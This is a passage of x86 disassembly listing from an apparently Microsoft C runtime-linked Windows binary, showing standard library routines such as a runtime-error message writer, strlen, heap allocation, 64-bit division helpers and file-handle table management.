  403fba:	0f 84 d7 00 00 00    	je     0x404097
  403fc0:	81 fa fc 00 00 00    	cmp    $0xfc,%edx
  403fc6:	0f 84 f1 00 00 00    	je     0x4040bd
  403fcc:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  403fd2:	68 04 01 00 00       	push   $0x104
  403fd7:	50                   	push   %eax
  403fd8:	6a 00                	push   $0x0
  403fda:	ff 15 04 80 40 00    	call   *0x408004
  403fe0:	85 c0                	test   %eax,%eax
  403fe2:	75 13                	jne    0x403ff7
  403fe4:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  403fea:	68 88 84 40 00       	push   $0x408488
  403fef:	50                   	push   %eax
  403ff0:	e8 4b 1e 00 00       	call   0x405e40
  403ff5:	59                   	pop    %ecx
  403ff6:	59                   	pop    %ecx
  403ff7:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  403ffd:	57                   	push   %edi
  403ffe:	50                   	push   %eax
  403fff:	8d bd 5c fe ff ff    	lea    -0x1a4(%ebp),%edi
  404005:	e8 96 01 00 00       	call   0x4041a0
  40400a:	40                   	inc    %eax
  40400b:	59                   	pop    %ecx
  40400c:	83 f8 3c             	cmp    $0x3c,%eax
  40400f:	76 29                	jbe    0x40403a
  404011:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  404017:	50                   	push   %eax
  404018:	e8 83 01 00 00       	call   0x4041a0
  40401d:	8b f8                	mov    %eax,%edi
  40401f:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  404025:	83 e8 3b             	sub    $0x3b,%eax
  404028:	6a 03                	push   $0x3
  40402a:	03 f8                	add    %eax,%edi
  40402c:	68 84 84 40 00       	push   $0x408484
  404031:	57                   	push   %edi
  404032:	e8 69 26 00 00       	call   0x4066a0
  404037:	83 c4 10             	add    $0x10,%esp
  40403a:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  404040:	68 68 84 40 00       	push   $0x408468
  404045:	50                   	push   %eax
  404046:	e8 f5 1d 00 00       	call   0x405e40
  40404b:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  404051:	57                   	push   %edi
  404052:	50                   	push   %eax
  404053:	e8 f8 1d 00 00       	call   0x405e50
  404058:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  40405e:	68 64 84 40 00       	push   $0x408464
  404063:	50                   	push   %eax
  404064:	e8 e7 1d 00 00       	call   0x405e50
  404069:	ff b6 ac 95 40 00    	push   0x4095ac(%esi)
  40406f:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  404075:	50                   	push   %eax
  404076:	e8 d5 1d 00 00       	call   0x405e50
  40407b:	68 10 20 01 00       	push   $0x12010
  404080:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  404086:	68 3c 84 40 00       	push   $0x40843c
  40408b:	50                   	push   %eax
  40408c:	e8 7e 25 00 00       	call   0x40660f
  404091:	83 c4 2c             	add    $0x2c,%esp
  404094:	5f                   	pop    %edi
  404095:	eb 26                	jmp    0x4040bd
  404097:	8d 45 08             	lea    0x8(%ebp),%eax
  40409a:	8d b6 ac 95 40 00    	lea    0x4095ac(%esi),%esi
  4040a0:	6a 00                	push   $0x0
  4040a2:	50                   	push   %eax
  4040a3:	ff 36                	push   (%esi)
  4040a5:	e8 f6 00 00 00       	call   0x4041a0
  4040aa:	59                   	pop    %ecx
  4040ab:	50                   	push   %eax
  4040ac:	ff 36                	push   (%esi)
  4040ae:	6a f4                	push   $0xfffffff4
  4040b0:	ff 15 6c 80 40 00    	call   *0x40806c
  4040b6:	50                   	push   %eax
  4040b7:	ff 15 ac 80 40 00    	call   *0x4080ac
  4040bd:	5e                   	pop    %esi
  4040be:	c9                   	leave
  4040bf:	c3                   	ret
  4040c0:	ff 35 58 bf 40 00    	push   0x40bf58
  4040c6:	ff 74 24 08          	push   0x8(%esp)
  4040ca:	e8 03 00 00 00       	call   0x4040d2
  4040cf:	59                   	pop    %ecx
  4040d0:	59                   	pop    %ecx
  4040d1:	c3                   	ret
  4040d2:	83 7c 24 04 e0       	cmpl   $0xffffffe0,0x4(%esp)
  4040d7:	77 22                	ja     0x4040fb
  4040d9:	ff 74 24 04          	push   0x4(%esp)
  4040dd:	e8 1c 00 00 00       	call   0x4040fe
  4040e2:	85 c0                	test   %eax,%eax
  4040e4:	59                   	pop    %ecx
  4040e5:	75 16                	jne    0x4040fd
  4040e7:	39 44 24 08          	cmp    %eax,0x8(%esp)
  4040eb:	74 10                	je     0x4040fd
  4040ed:	ff 74 24 04          	push   0x4(%esp)
  4040f1:	e8 a8 26 00 00       	call   0x40679e
  4040f6:	85 c0                	test   %eax,%eax
  4040f8:	59                   	pop    %ecx
  4040f9:	75 de                	jne    0x4040d9
  4040fb:	33 c0                	xor    %eax,%eax
  4040fd:	c3                   	ret
  4040fe:	a1 c8 c1 40 00       	mov    0x40c1c8,%eax
  404103:	56                   	push   %esi
  404104:	8b 74 24 08          	mov    0x8(%esp),%esi
  404108:	83 f8 03             	cmp    $0x3,%eax
  40410b:	75 15                	jne    0x404122
  40410d:	3b 35 c0 c1 40 00    	cmp    0x40c1c0,%esi
  404113:	77 3f                	ja     0x404154
  404115:	56                   	push   %esi
  404116:	e8 71 0b 00 00       	call   0x404c8c
  40411b:	85 c0                	test   %eax,%eax
  40411d:	59                   	pop    %ecx
  40411e:	74 34                	je     0x404154
  404120:	5e                   	pop    %esi
  404121:	c3                   	ret
  404122:	83 f8 02             	cmp    $0x2,%eax
  404125:	75 2d                	jne    0x404154
  404127:	8b 44 24 08          	mov    0x8(%esp),%eax
  40412b:	85 c0                	test   %eax,%eax
  40412d:	74 08                	je     0x404137
  40412f:	8d 70 0f             	lea    0xf(%eax),%esi
  404132:	83 e6 f0             	and    $0xfffffff0,%esi
  404135:	eb 03                	jmp    0x40413a
  404137:	6a 10                	push   $0x10
  404139:	5e                   	pop    %esi
  40413a:	3b 35 fc b9 40 00    	cmp    0x40b9fc,%esi
  404140:	77 1f                	ja     0x404161
  404142:	8b c6                	mov    %esi,%eax
  404144:	c1 e8 04             	shr    $0x4,%eax
  404147:	50                   	push   %eax
  404148:	e8 ec 12 00 00       	call   0x405439
  40414d:	85 c0                	test   %eax,%eax
  40414f:	59                   	pop    %ecx
  404150:	75 1e                	jne    0x404170
  404152:	eb 0d                	jmp    0x404161
  404154:	85 f6                	test   %esi,%esi
  404156:	75 03                	jne    0x40415b
  404158:	6a 01                	push   $0x1
  40415a:	5e                   	pop    %esi
  40415b:	83 c6 0f             	add    $0xf,%esi
  40415e:	83 e6 f0             	and    $0xfffffff0,%esi
  404161:	56                   	push   %esi
  404162:	6a 00                	push   $0x0
  404164:	ff 35 c4 c1 40 00    	push   0x40c1c4
  40416a:	ff 15 b0 80 40 00    	call   *0x4080b0
  404170:	5e                   	pop    %esi
  404171:	c3                   	ret
  404172:	8b 44 24 04          	mov    0x4(%esp),%eax
  404176:	3b 05 e0 c2 40 00    	cmp    0x40c2e0,%eax
  40417c:	72 03                	jb     0x404181
  40417e:	33 c0                	xor    %eax,%eax
  404180:	c3                   	ret
  404181:	8b c8                	mov    %eax,%ecx
  404183:	83 e0 1f             	and    $0x1f,%eax
  404186:	c1 f9 05             	sar    $0x5,%ecx
  404189:	8b 0c 8d e0 c1 40 00 	mov    0x40c1e0(,%ecx,4),%ecx
  404190:	8a 44 c1 04          	mov    0x4(%ecx,%eax,8),%al
  404194:	83 e0 40             	and    $0x40,%eax
  404197:	c3                   	ret
  404198:	cc                   	int3
  404199:	cc                   	int3
  40419a:	cc                   	int3
  40419b:	cc                   	int3
  40419c:	cc                   	int3
  40419d:	cc                   	int3
  40419e:	cc                   	int3
  40419f:	cc                   	int3
  4041a0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4041a4:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  4041aa:	74 14                	je     0x4041c0
  4041ac:	8a 01                	mov    (%ecx),%al
  4041ae:	41                   	inc    %ecx
  4041af:	84 c0                	test   %al,%al
  4041b1:	74 40                	je     0x4041f3
  4041b3:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  4041b9:	75 f1                	jne    0x4041ac
  4041bb:	05 00 00 00 00       	add    $0x0,%eax
  4041c0:	8b 01                	mov    (%ecx),%eax
  4041c2:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  4041c7:	03 d0                	add    %eax,%edx
  4041c9:	83 f0 ff             	xor    $0xffffffff,%eax
  4041cc:	33 c2                	xor    %edx,%eax
  4041ce:	83 c1 04             	add    $0x4,%ecx
  4041d1:	a9 00 01 01 81       	test   $0x81010100,%eax
  4041d6:	74 e8                	je     0x4041c0
  4041d8:	8b 41 fc             	mov    -0x4(%ecx),%eax
  4041db:	84 c0                	test   %al,%al
  4041dd:	74 32                	je     0x404211
  4041df:	84 e4                	test   %ah,%ah
  4041e1:	74 24                	je     0x404207
  4041e3:	a9 00 00 ff 00       	test   $0xff0000,%eax
  4041e8:	74 13                	je     0x4041fd
  4041ea:	a9 00 00 00 ff       	test   $0xff000000,%eax
  4041ef:	74 02                	je     0x4041f3
  4041f1:	eb cd                	jmp    0x4041c0
  4041f3:	8d 41 ff             	lea    -0x1(%ecx),%eax
  4041f6:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4041fa:	2b c1                	sub    %ecx,%eax
  4041fc:	c3                   	ret
  4041fd:	8d 41 fe             	lea    -0x2(%ecx),%eax
  404200:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404204:	2b c1                	sub    %ecx,%eax
  404206:	c3                   	ret
  404207:	8d 41 fd             	lea    -0x3(%ecx),%eax
  40420a:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40420e:	2b c1                	sub    %ecx,%eax
  404210:	c3                   	ret
  404211:	8d 41 fc             	lea    -0x4(%ecx),%eax
  404214:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404218:	2b c1                	sub    %ecx,%eax
  40421a:	c3                   	ret
  40421b:	55                   	push   %ebp
  40421c:	8b ec                	mov    %esp,%ebp
  40421e:	8b 45 08             	mov    0x8(%ebp),%eax
  404221:	85 c0                	test   %eax,%eax
  404223:	75 02                	jne    0x404227
  404225:	5d                   	pop    %ebp
  404226:	c3                   	ret
  404227:	83 3d 68 bf 40 00 00 	cmpl   $0x0,0x40bf68
  40422e:	75 12                	jne    0x404242
  404230:	66 8b 4d 0c          	mov    0xc(%ebp),%cx
  404234:	66 81 f9 ff 00       	cmp    $0xff,%cx
  404239:	77 39                	ja     0x404274
  40423b:	6a 01                	push   $0x1
  40423d:	88 08                	mov    %cl,(%eax)
  40423f:	58                   	pop    %eax
  404240:	5d                   	pop    %ebp
  404241:	c3                   	ret
  404242:	8d 4d 08             	lea    0x8(%ebp),%ecx
  404245:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  404249:	51                   	push   %ecx
  40424a:	6a 00                	push   $0x0
  40424c:	ff 35 00 bb 40 00    	push   0x40bb00
  404252:	50                   	push   %eax
  404253:	8d 45 0c             	lea    0xc(%ebp),%eax
  404256:	6a 01                	push   $0x1
  404258:	50                   	push   %eax
  404259:	68 20 02 00 00       	push   $0x220
  40425e:	ff 35 78 bf 40 00    	push   0x40bf78
  404264:	ff 15 88 80 40 00    	call   *0x408088
  40426a:	85 c0                	test   %eax,%eax
  40426c:	74 06                	je     0x404274
  40426e:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  404272:	74 0d                	je     0x404281
  404274:	c7 05 e4 bd 40 00 2a 	movl   $0x2a,0x40bde4
  40427b:	00 00 00 
  40427e:	83 c8 ff             	or     $0xffffffff,%eax
  404281:	5d                   	pop    %ebp
  404282:	c3                   	ret
  404283:	cc                   	int3
  404284:	cc                   	int3
  404285:	cc                   	int3
  404286:	cc                   	int3
  404287:	cc                   	int3
  404288:	cc                   	int3
  404289:	cc                   	int3
  40428a:	cc                   	int3
  40428b:	cc                   	int3
  40428c:	cc                   	int3
  40428d:	cc                   	int3
  40428e:	cc                   	int3
  40428f:	cc                   	int3
  404290:	53                   	push   %ebx
  404291:	56                   	push   %esi
  404292:	8b 44 24 18          	mov    0x18(%esp),%eax
  404296:	0b c0                	or     %eax,%eax
  404298:	75 18                	jne    0x4042b2
  40429a:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40429e:	8b 44 24 10          	mov    0x10(%esp),%eax
  4042a2:	33 d2                	xor    %edx,%edx
  4042a4:	f7 f1                	div    %ecx
  4042a6:	8b d8                	mov    %eax,%ebx
  4042a8:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4042ac:	f7 f1                	div    %ecx
  4042ae:	8b d3                	mov    %ebx,%edx
  4042b0:	eb 41                	jmp    0x4042f3
  4042b2:	8b c8                	mov    %eax,%ecx
  4042b4:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  4042b8:	8b 54 24 10          	mov    0x10(%esp),%edx
  4042bc:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4042c0:	d1 e9                	shr    $1,%ecx
  4042c2:	d1 db                	rcr    $1,%ebx
  4042c4:	d1 ea                	shr    $1,%edx
  4042c6:	d1 d8                	rcr    $1,%eax
  4042c8:	0b c9                	or     %ecx,%ecx
  4042ca:	75 f4                	jne    0x4042c0
  4042cc:	f7 f3                	div    %ebx
  4042ce:	8b f0                	mov    %eax,%esi
  4042d0:	f7 64 24 18          	mull   0x18(%esp)
  4042d4:	8b c8                	mov    %eax,%ecx
  4042d6:	8b 44 24 14          	mov    0x14(%esp),%eax
  4042da:	f7 e6                	mul    %esi
  4042dc:	03 d1                	add    %ecx,%edx
  4042de:	72 0e                	jb     0x4042ee
  4042e0:	3b 54 24 10          	cmp    0x10(%esp),%edx
  4042e4:	77 08                	ja     0x4042ee
  4042e6:	72 07                	jb     0x4042ef
  4042e8:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  4042ec:	76 01                	jbe    0x4042ef
  4042ee:	4e                   	dec    %esi
  4042ef:	33 d2                	xor    %edx,%edx
  4042f1:	8b c6                	mov    %esi,%eax
  4042f3:	5e                   	pop    %esi
  4042f4:	5b                   	pop    %ebx
  4042f5:	c2 10 00             	ret    $0x10
  4042f8:	cc                   	int3
  4042f9:	cc                   	int3
  4042fa:	cc                   	int3
  4042fb:	cc                   	int3
  4042fc:	cc                   	int3
  4042fd:	cc                   	int3
  4042fe:	cc                   	int3
  4042ff:	cc                   	int3
  404300:	53                   	push   %ebx
  404301:	8b 44 24 14          	mov    0x14(%esp),%eax
  404305:	0b c0                	or     %eax,%eax
  404307:	75 18                	jne    0x404321
  404309:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40430d:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404311:	33 d2                	xor    %edx,%edx
  404313:	f7 f1                	div    %ecx
  404315:	8b 44 24 08          	mov    0x8(%esp),%eax
  404319:	f7 f1                	div    %ecx
  40431b:	8b c2                	mov    %edx,%eax
  40431d:	33 d2                	xor    %edx,%edx
  40431f:	eb 50                	jmp    0x404371
  404321:	8b c8                	mov    %eax,%ecx
  404323:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  404327:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40432b:	8b 44 24 08          	mov    0x8(%esp),%eax
  40432f:	d1 e9                	shr    $1,%ecx
  404331:	d1 db                	rcr    $1,%ebx
  404333:	d1 ea                	shr    $1,%edx
  404335:	d1 d8                	rcr    $1,%eax
  404337:	0b c9                	or     %ecx,%ecx
  404339:	75 f4                	jne    0x40432f
  40433b:	f7 f3                	div    %ebx
  40433d:	8b c8                	mov    %eax,%ecx
  40433f:	f7 64 24 14          	mull   0x14(%esp)
  404343:	91                   	xchg   %eax,%ecx
  404344:	f7 64 24 10          	mull   0x10(%esp)
  404348:	03 d1                	add    %ecx,%edx
  40434a:	72 0e                	jb     0x40435a
  40434c:	3b 54 24 0c          	cmp    0xc(%esp),%edx
  404350:	77 08                	ja     0x40435a
  404352:	72 0e                	jb     0x404362
  404354:	3b 44 24 08          	cmp    0x8(%esp),%eax
  404358:	76 08                	jbe    0x404362
  40435a:	2b 44 24 10          	sub    0x10(%esp),%eax
  40435e:	1b 54 24 14          	sbb    0x14(%esp),%edx
  404362:	2b 44 24 08          	sub    0x8(%esp),%eax
  404366:	1b 54 24 0c          	sbb    0xc(%esp),%edx
  40436a:	f7 da                	neg    %edx
  40436c:	f7 d8                	neg    %eax
  40436e:	83 da 00             	sbb    $0x0,%edx
  404371:	5b                   	pop    %ebx
  404372:	c2 10 00             	ret    $0x10
  404375:	55                   	push   %ebp
  404376:	8b ec                	mov    %esp,%ebp
  404378:	56                   	push   %esi
  404379:	8b 75 08             	mov    0x8(%ebp),%esi
  40437c:	0f af 75 0c          	imul   0xc(%ebp),%esi
  404380:	83 fe e0             	cmp    $0xffffffe0,%esi
  404383:	57                   	push   %edi
  404384:	89 75 08             	mov    %esi,0x8(%ebp)
  404387:	77 0d                	ja     0x404396
  404389:	85 f6                	test   %esi,%esi
  40438b:	75 03                	jne    0x404390
  40438d:	6a 01                	push   $0x1
  40438f:	5e                   	pop    %esi
  404390:	83 c6 0f             	add    $0xf,%esi
  404393:	83 e6 f0             	and    $0xfffffff0,%esi
  404396:	33 ff                	xor    %edi,%edi
  404398:	83 fe e0             	cmp    $0xffffffe0,%esi
  40439b:	77 58                	ja     0x4043f5
  40439d:	a1 c8 c1 40 00       	mov    0x40c1c8,%eax
  4043a2:	83 f8 03             	cmp    $0x3,%eax
  4043a5:	75 1a                	jne    0x4043c1
  4043a7:	8b 45 08             	mov    0x8(%ebp),%eax
  4043aa:	3b 05 c0 c1 40 00    	cmp    0x40c1c0,%eax
  4043b0:	77 2e                	ja     0x4043e0
  4043b2:	50                   	push   %eax
  4043b3:	e8 d4 08 00 00       	call   0x404c8c
  4043b8:	8b f8                	mov    %eax,%edi
  4043ba:	59                   	pop    %ecx
  4043bb:	85 ff                	test   %edi,%edi
  4043bd:	75 4c                	jne    0x40440b
  4043bf:	eb 1f                	jmp    0x4043e0
  4043c1:	83 f8 02             	cmp    $0x2,%eax
  4043c4:	75 1a                	jne    0x4043e0
  4043c6:	3b 35 fc b9 40 00    	cmp    0x40b9fc,%esi
  4043cc:	77 12                	ja     0x4043e0
  4043ce:	8b c6                	mov    %esi,%eax
  4043d0:	c1 e8 04             	shr    $0x4,%eax
  4043d3:	50                   	push   %eax
  4043d4:	e8 60 10 00 00       	call   0x405439
  4043d9:	8b f8                	mov    %eax,%edi
  4043db:	59                   	pop    %ecx
  4043dc:	85 ff                	test   %edi,%edi
  4043de:	75 3f                	jne    0x40441f
  4043e0:	56                   	push   %esi
  4043e1:	6a 08                	push   $0x8
  4043e3:	ff 35 c4 c1 40 00    	push   0x40c1c4
  4043e9:	ff 15 b0 80 40 00    	call   *0x4080b0
  4043ef:	8b f8                	mov    %eax,%edi
  4043f1:	85 ff                	test   %edi,%edi
  4043f3:	75 24                	jne    0x404419
  4043f5:	83 3d 58 bf 40 00 00 	cmpl   $0x0,0x40bf58
  4043fc:	74 1b                	je     0x404419
  4043fe:	56                   	push   %esi
  4043ff:	e8 9a 23 00 00       	call   0x40679e
  404404:	85 c0                	test   %eax,%eax
  404406:	59                   	pop    %ecx
  404407:	74 19                	je     0x404422
  404409:	eb 8b                	jmp    0x404396
  40440b:	ff 75 08             	push   0x8(%ebp)
  40440e:	6a 00                	push   $0x0
  404410:	57                   	push   %edi
  404411:	e8 ba 23 00 00       	call   0x4067d0
  404416:	83 c4 0c             	add    $0xc,%esp
  404419:	8b c7                	mov    %edi,%eax
  40441b:	5f                   	pop    %edi
  40441c:	5e                   	pop    %esi
  40441d:	5d                   	pop    %ebp
  40441e:	c3                   	ret
  40441f:	56                   	push   %esi
  404420:	eb ec                	jmp    0x40440e
  404422:	33 c0                	xor    %eax,%eax
  404424:	eb f5                	jmp    0x40441b
  404426:	56                   	push   %esi
  404427:	57                   	push   %edi
  404428:	6a 03                	push   $0x3
  40442a:	33 ff                	xor    %edi,%edi
  40442c:	5e                   	pop    %esi
  40442d:	39 35 00 d3 40 00    	cmp    %esi,0x40d300
  404433:	7e 44                	jle    0x404479
  404435:	a1 f8 c2 40 00       	mov    0x40c2f8,%eax
  40443a:	8b 04 b0             	mov    (%eax,%esi,4),%eax
  40443d:	85 c0                	test   %eax,%eax
  40443f:	74 2f                	je     0x404470
  404441:	f6 40 0c 83          	testb  $0x83,0xc(%eax)
  404445:	74 0d                	je     0x404454
  404447:	50                   	push   %eax
  404448:	e8 e4 dc ff ff       	call   0x402131
  40444d:	83 f8 ff             	cmp    $0xffffffff,%eax
  404450:	59                   	pop    %ecx
  404451:	74 01                	je     0x404454
  404453:	47                   	inc    %edi
  404454:	83 fe 14             	cmp    $0x14,%esi
  404457:	7c 17                	jl     0x404470
  404459:	a1 f8 c2 40 00       	mov    0x40c2f8,%eax
  40445e:	ff 34 b0             	push   (%eax,%esi,4)
  404461:	e8 e6 ed ff ff       	call   0x40324c
  404466:	a1 f8 c2 40 00       	mov    0x40c2f8,%eax
  40446b:	59                   	pop    %ecx
  40446c:	83 24 b0 00          	andl   $0x0,(%eax,%esi,4)
  404470:	46                   	inc    %esi
  404471:	3b 35 00 d3 40 00    	cmp    0x40d300,%esi
  404477:	7c bc                	jl     0x404435
  404479:	8b c7                	mov    %edi,%eax
  40447b:	5f                   	pop    %edi
  40447c:	5e                   	pop    %esi
  40447d:	c3                   	ret
  40447e:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404482:	33 d2                	xor    %edx,%edx
  404484:	89 0d e8 bd 40 00    	mov    %ecx,0x40bde8
  40448a:	b8 70 98 40 00       	mov    $0x409870,%eax
  40448f:	3b 08                	cmp    (%eax),%ecx
  404491:	74 20                	je     0x4044b3
  404493:	83 c0 08             	add    $0x8,%eax
  404496:	42                   	inc    %edx
  404497:	3d d8 99 40 00       	cmp    $0x4099d8,%eax
  40449c:	72 f1                	jb     0x40448f
  40449e:	83 f9 13             	cmp    $0x13,%ecx
  4044a1:	72 1d                	jb     0x4044c0
  4044a3:	83 f9 24             	cmp    $0x24,%ecx
  4044a6:	77 18                	ja     0x4044c0
  4044a8:	c7 05 e4 bd 40 00 0d 	movl   $0xd,0x40bde4
  4044af:	00 00 00 
  4044b2:	c3                   	ret
  4044b3:	8b 04 d5 74 98 40 00 	mov    0x409874(,%edx,8),%eax
  4044ba:	a3 e4 bd 40 00       	mov    %eax,0x40bde4
  4044bf:	c3                   	ret
  4044c0:	81 f9 bc 00 00 00    	cmp    $0xbc,%ecx
  4044c6:	72 12                	jb     0x4044da
  4044c8:	81 f9 ca 00 00 00    	cmp    $0xca,%ecx
  4044ce:	c7 05 e4 bd 40 00 08 	movl   $0x8,0x40bde4
  4044d5:	00 00 00 
  4044d8:	76 0a                	jbe    0x4044e4
  4044da:	c7 05 e4 bd 40 00 16 	movl   $0x16,0x40bde4
  4044e1:	00 00 00 
  4044e4:	c3                   	ret
  4044e5:	53                   	push   %ebx
  4044e6:	56                   	push   %esi
  4044e7:	57                   	push   %edi
  4044e8:	83 cb ff             	or     $0xffffffff,%ebx
  4044eb:	33 ff                	xor    %edi,%edi
  4044ed:	33 f6                	xor    %esi,%esi
  4044ef:	b9 e0 c1 40 00       	mov    $0x40c1e0,%ecx
  4044f4:	8b 01                	mov    (%ecx),%eax
  4044f6:	85 c0                	test   %eax,%eax
  4044f8:	74 37                	je     0x404531
  4044fa:	8d 90 00 01 00 00    	lea    0x100(%eax),%edx
  404500:	3b c2                	cmp    %edx,%eax
  404502:	73 1c                	jae    0x404520
  404504:	f6 40 04 01          	testb  $0x1,0x4(%eax)
  404508:	74 05                	je     0x40450f
  40450a:	83 c0 08             	add    $0x8,%eax
  40450d:	eb f1                	jmp    0x404500
  40450f:	83 08 ff             	orl    $0xffffffff,(%eax)
  404512:	2b 01                	sub    (%ecx),%eax
  404514:	c1 f8 03             	sar    $0x3,%eax
  404517:	03 c6                	add    %esi,%eax
  404519:	8b d8                	mov    %eax,%ebx
  40451b:	83 fb ff             	cmp    $0xffffffff,%ebx
  40451e:	75 54                	jne    0x404574
  404520:	83 c1 04             	add    $0x4,%ecx
  404523:	47                   	inc    %edi
  404524:	83 c6 20             	add    $0x20,%esi
  404527:	81 f9 e0 c2 40 00    	cmp    $0x40c2e0,%ecx
  40452d:	7c c5                	jl     0x4044f4
  40452f:	eb 43                	jmp    0x404574
  404531:	be 00 01 00 00       	mov    $0x100,%esi
  404536:	56                   	push   %esi
  404537:	e8 84 fb ff ff       	call   0x4040c0
  40453c:	85 c0                	test   %eax,%eax
  40453e:	59                   	pop    %ecx
  40453f:	74 33                	je     0x404574
  404541:	83 05 e0 c2 40 00 20 	addl   $0x20,0x40c2e0
  404548:	8d 0c bd e0 c1 40 00 	lea    0x40c1e0(,%edi,4),%ecx
  40454f:	8d 90 00 01 00 00    	lea    0x100(%eax),%edx
  404555:	89 01                	mov    %eax,(%ecx)
  404557:	3b c2                	cmp    %edx,%eax
  404559:	73 14                	jae    0x40456f
  40455b:	80 60 04 00          	andb   $0x0,0x4(%eax)
  40455f:	83 08 ff             	orl    $0xffffffff,(%eax)
  404562:	c6 40 05 0a          	movb   $0xa,0x5(%eax)
  404566:	8b 11                	mov    (%ecx),%edx
  404568:	83 c0 08             	add    $0x8,%eax
  40456b:	03 d6                	add    %esi,%edx
  40456d:	eb e8                	jmp    0x404557
  40456f:	c1 e7 05             	shl    $0x5,%edi
  404572:	8b df                	mov    %edi,%ebx
  404574:	5f                   	pop    %edi
  404575:	8b c3                	mov    %ebx,%eax
  404577:	5e                   	pop    %esi
  404578:	5b                   	pop    %ebx
  404579:	c3                   	ret
  40457a:	8b 44 24 04          	mov    0x4(%esp),%eax
  40457e:	56                   	push   %esi
  40457f:	3b 05 e0 c2 40 00    	cmp    0x40c2e0,%eax
  404585:	57                   	push   %edi
  404586:	73 52                	jae    0x4045da
  404588:	8b c8                	mov    %eax,%ecx
  40458a:	8b f0                	mov    %eax,%esi
  40458c:	c1 f9 05             	sar    $0x5,%ecx
  40458f:	83 e6 1f             	and    $0x1f,%esi
  404592:	8d 3c 8d e0 c1 40 00 	lea    0x40c1e0(,%ecx,4),%edi
  404599:	c1 e6 03             	shl    $0x3,%esi
  40459c:	8b 0f                	mov    (%edi),%ecx
  40459e:	83 3c 31 ff          	cmpl   $0xffffffff,(%ecx,%esi,1)
  4045a2:	75 36                	jne    0x4045da
  4045a4:	83 3d 74 92 40 00 01 	cmpl   $0x1,0x409274
  4045ab:	53                   	push   %ebx
  4045ac:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  4045b0:	75 1e                	jne    0x4045d0
  4045b2:	83 e8 00             	sub    $0x0,%eax
  4045b5:	74 10                	je     0x4045c7
  4045b7:	48                   	dec    %eax
  4045b8:	74 08                	je     0x4045c2
  4045ba:	48                   	dec    %eax
  4045bb:	75 13                	jne    0x4045d0
  4045bd:	53                   	push   %ebx
  4045be:	6a f4                	push   $0xfffffff4
  4045c0:	eb 08                	jmp    0x4045ca
  4045c2:	53                   	push   %ebx
  4045c3:	6a f5                	push   $0xfffffff5
  4045c5:	eb 03                	jmp    0x4045ca
  4045c7:	53                   	push   %ebx
  4045c8:	6a f6                	push   $0xfffffff6
  4045ca:	ff 15 b4 80 40 00    	call   *0x4080b4
  4045d0:	8b 07                	mov    (%edi),%eax
  4045d2:	89 1c 30             	mov    %ebx,(%eax,%esi,1)
  4045d5:	33 c0                	xor    %eax,%eax
  4045d7:	5b                   	pop    %ebx
  4045d8:	eb 14                	jmp    0x4045ee
  4045da:	83 25 e8 bd 40 00 00 	andl   $0x0,0x40bde8
  4045e1:	c7 05 e4 bd 40 00 09 	movl   $0x9,0x40bde4
  4045e8:	00 00 00 
  4045eb:	83 c8 ff             	or     $0xffffffff,%eax
  4045ee:	5f                   	pop    %edi
  4045ef:	5e                   	pop    %esi
  4045f0:	c3                   	ret
  4045f1:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4045f5:	56                   	push   %esi
  4045f6:	3b 0d e0 c2 40 00    	cmp    0x40c2e0,%ecx
  4045fc:	57                   	push   %edi
  4045fd:	73 55                	jae    0x404654
  4045ff:	8b c1                	mov    %ecx,%eax
  404601:	8b f1                	mov    %ecx,%esi
  404603:	c1 f8 05             	sar    $0x5,%eax
  404606:	83 e6 1f             	and    $0x1f,%esi
  404609:	8d 3c 85 e0 c1 40 00 	lea    0x40c1e0(,%eax,4),%edi
  404610:	c1 e6 03             	shl    $0x3,%esi
  404613:	8b 07                	mov    (%edi),%eax
  404615:	03 c6                	add    %esi,%eax
  404617:	f6 40 04 01          	testb  $0x1,0x4(%eax)
  40461b:	74 37                	je     0x404654
  40461d:	83 38 ff             	cmpl   $0xffffffff,(%eax)
  404620:	74 32                	je     0x404654
  404622:	83 3d 74 92 40 00 01 	cmpl   $0x1,0x409274
  404629:	75 1f                	jne    0x40464a
  40462b:	33 c0                	xor    %eax,%eax
  40462d:	2b c8                	sub    %eax,%ecx
  40462f:	74 10                	je     0x404641
  404631:	49                   	dec    %ecx
  404632:	74 08                	je     0x40463c
  404634:	49                   	dec    %ecx
  404635:	75 13                	jne    0x40464a
  404637:	50                   	push   %eax
  404638:	6a f4                	push   $0xfffffff4
  40463a:	eb 08                	jmp    0x404644
  40463c:	50                   	push   %eax
  40463d:	6a f5                	push   $0xfffffff5
  40463f:	eb 03                	jmp    0x404644
  404641:	50                   	push   %eax
  404642:	6a f6                	push   $0xfffffff6
  404644:	ff 15 b4 80 40 00    	call   *0x4080b4
  40464a:	8b 07                	mov    (%edi),%eax
  40464c:	83 0c 30 ff          	orl    $0xffffffff,(%eax,%esi,1)
  404650:	33 c0                	xor    %eax,%eax
